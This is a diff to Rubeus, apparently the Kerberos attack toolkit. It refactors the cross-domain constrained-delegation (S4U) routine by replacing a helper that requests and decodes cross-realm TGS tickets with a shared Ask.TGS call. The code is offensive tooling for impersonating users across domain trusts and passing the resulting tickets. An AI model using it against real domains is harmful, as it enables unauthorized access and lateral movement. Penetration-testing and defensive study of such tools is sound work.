@@ -478,7 +478,8 @@ namespace Rubeus
 
             // First retrieve our service ticket for the target domains KRBTGT from our DC
             Console.WriteLine("[*] Retrieving TGS from {0} for foreign domain, {1}, KRBTGT service", domain, targetDomain);
-            KRB_CRED crossTGS = CrossDomainKRBTGT(userName, domain, domainController, targetDomain, ticket, clientKey, etype, Interop.KERB_ETYPE.subkey_keymaterial);
+            byte[] crossBytes = Ask.TGS(userName, domain, ticket, clientKey, etype, string.Format("krbtgt/{0}", targetDomain), Interop.KERB_ETYPE.subkey_keymaterial, "", false, domainController, true);
+            KRB_CRED crossTGS = new KRB_CRED(crossBytes);
             Interop.KERB_ETYPE crossEtype = (Interop.KERB_ETYPE)crossTGS.enc_part.ticket_info[0].key.keytype;
             byte[] crossKey = crossTGS.enc_part.ticket_info[0].key.keyvalue;
 
@@ -504,106 +505,6 @@ namespace Rubeus
             // Lastly retrieve the final S4U2Proxy from the foreign domains DC
             // This is the service ticket we need to access the target service
             KRB_CRED foreignS4U2Proxy = CrossDomainS4U2Proxy(string.Format("{0}@{1}", userName, domain), string.Format("{0}@{1}", targetUser, targetDomain), targetSPN, targetDomainController, crossTGS.tickets[0], crossKey, crossEtype, Interop.KERB_ETYPE.subkey_keymaterial, localS4U2Proxy.tickets[0], true, ptt);
-        }
-
-        private static KRB_CRED CrossDomainKRBTGT(string userName, string domain, string domainController, string targetDomain, Ticket ticket, byte[] clientKey, Interop.KERB_ETYPE etype, Interop.KERB_ETYPE requestEType)
-        {
-            // die if can't get IP of DC
-            string dcIP = Networking.GetDCIP(domainController);
-            if (String.IsNullOrEmpty(dcIP)) { return null; }
-
-            Console.WriteLine("[*] Requesting the cross realm 'TGS' for {0} from {1}", targetDomain, domainController);
-            byte[] tgsBytes = TGS_REQ.NewTGSReq(userName, domain, targetDomain, ticket, clientKey, etype, requestEType);
-
-            Console.WriteLine("[*] Sending cross realm TGS request");
-            byte[] response = Networking.SendBytes(dcIP, 88, tgsBytes);
-            if (response == null)
-            {
-                return null;
-            }
-
-            // decode the supplied bytes to an AsnElt object
-            //  false == ignore trailing garbage
-            AsnElt responseAsn = AsnElt.Decode(response, false);
-
-            // check the response value
-            int responseTag = responseAsn.TagValue;
-
-            if (responseTag == 13)
-            {
-                Console.WriteLine("[+] cross realm TGS success!");
-
-                // parse the response to an TGS-REP
-                TGS_REP rep = new TGS_REP(responseAsn);
-                // KRB_KEY_USAGE_TGS_REP_EP_SESSION_KEY = 8
-                byte[] outBytes = Crypto.KerberosDecrypt(etype, Interop.KRB_KEY_USAGE_TGS_REP_EP_SESSION_KEY, clientKey, rep.enc_part.cipher);
-                AsnElt ae = AsnElt.Decode(outBytes, false);
-                EncKDCRepPart encRepPart = new EncKDCRepPart(ae.Sub[0]);
-
-                // now build the final KRB-CRED structure
-                KRB_CRED cred = new KRB_CRED();
-
-                // add the ticket
-                cred.tickets.Add(rep.ticket);
-
-                // build the EncKrbCredPart/KrbCredInfo parts from the ticket and the data in the encRepPart
-
-                KrbCredInfo info = new KrbCredInfo();
-
-                // [0] add in the session key
-                info.key.keytype = encRepPart.key.keytype;
-                info.key.keyvalue = encRepPart.key.keyvalue;
-
-                // [1] prealm (domain)
-                info.prealm = encRepPart.realm;
-
-                // [2] pname (user)
-                info.pname.name_type = rep.cname.name_type;
-                info.pname.name_string = rep.cname.name_string;
-
-                // [3] flags
-                info.flags = encRepPart.flags;
-
-                // [4] authtime (not required)
-
-                // [5] starttime
-                info.starttime = encRepPart.starttime;
-
-                // [6] endtime
-                info.endtime = encRepPart.endtime;
-
-                // [7] renew-till
-                info.renew_till = encRepPart.renew_till;
-
-                // [8] srealm
-                info.srealm = encRepPart.realm;
-
-                // [9] sname
-                info.sname.name_type = encRepPart.sname.name_type;
-                info.sname.name_string = encRepPart.sname.name_string;
-
-                // add the ticket_info into the cred object
-                cred.enc_part.ticket_info.Add(info);
-
-                byte[] kirbiBytes = cred.Encode().Encode();
-
-                PrintTicket(kirbiBytes, "base64(ticket.kirbi)");
-
-                KRB_CRED kirbi = new KRB_CRED(kirbiBytes);
-
-                return kirbi;
-            }
-            else if (responseTag == 30)
-            {
-                // parse the response to an KRB-ERROR
-                KRB_ERROR error = new KRB_ERROR(responseAsn.Sub[0]);
-                Console.WriteLine("\r\n[X] KRB-ERROR ({0}) : {1}\r\n", error.error_code, (Interop.KERBEROS_ERROR)error.error_code);
-            }
-            else
-            {
-                Console.WriteLine("\r\n[X] Unknown application tag: {0}", responseTag);
-            }
-            return null;
         }
 
         // to perform the 2 S4U2Self requests
